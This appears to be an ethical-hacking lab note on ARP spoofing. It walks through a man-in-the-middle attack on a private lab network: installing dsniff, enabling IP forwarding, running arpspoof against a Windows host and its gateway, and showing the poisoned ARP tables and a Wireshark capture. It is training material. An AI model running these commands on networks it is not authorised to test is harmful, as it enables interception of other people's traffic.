# ARP Spoofing

ARP does not have an authentication mechanism.

```par
Internet --> Gateway --> Victim
                |        ^
                |       /
                |      /
                Hacker/
```

Gateway and Victim update their iptables.

MIM

```par
    Internet --> Gateway    Victim
                    |        ^
                    |       /
                    |      /
pretending to be a router Hacker/
```

Gateway and Victim update their iptables.

```sudo apt-get install dsniff```

arpspoof part of dsniff

## Kali Machine

### Enable ip forwarding

sysctl -w net.ipv4.ip_forward=1
arp Table original

```sh
? (192.168.221.128) at 00:0c:29:a1:09:cb [ether] on eth0
? (192.168.221.2) at 00:50:56:e6:48:53 [ether] on eth0
```

```arp -a```


## Windows Machine

```cmd
Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::c83e:c92d:a70b:4df2%7
   IPv4 Address. . . . . . . . . . . : 192.168.221.128
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.221.2

  Internet Address      Physical Address      Type
  192.168.221.2         00-50-56-e6-48-53     dynamic
  192.168.221.133       00-0c-29-2a-ad-39     dynamic
  192.168.221.254       00-50-56-fd-6e-58     dynamic
  192.168.221.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

```arpspoof -i eth0 -t 192.168.221.128 192.168.221.2```

## MITM Attack Kali Machine

```bash
kali@kali:/mnt/hgfs/Training/EthicalGo/GoHacking/arpspoofing$ arp -a
? (192.168.221.1) at 00:50:56:c0:00:08 [ether] on eth0
? (192.168.221.2) at 00:50:56:e6:48:53 [ether] on eth0
? (192.168.221.254) at 00:50:56:fc:35:79 [ether] on eth0
```

After spoffing Windows arp table

```cmd
Interface: 192.168.221.128 --- 0x7
  Internet Address      Physical Address      Type
  192.168.221.2         00-0c-29-2a-ad-39     dynamic
  192.168.221.133       00-0c-29-2a-ad-39     dynamic
  192.168.221.254       00-50-56-fd-6e-58     dynamic
  192.168.221.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

## Spoof Router

```arpspoof -i eth0 -t 192.168.221.2 192.168.221.128```

## Wireshark capture from Kali machine

```wireshark
199	82.869451813	172.217.165.142	192.168.221.128	ICMP	74	Echo (ping) reply    id=0x0001, seq=55/14080, ttl=127

```

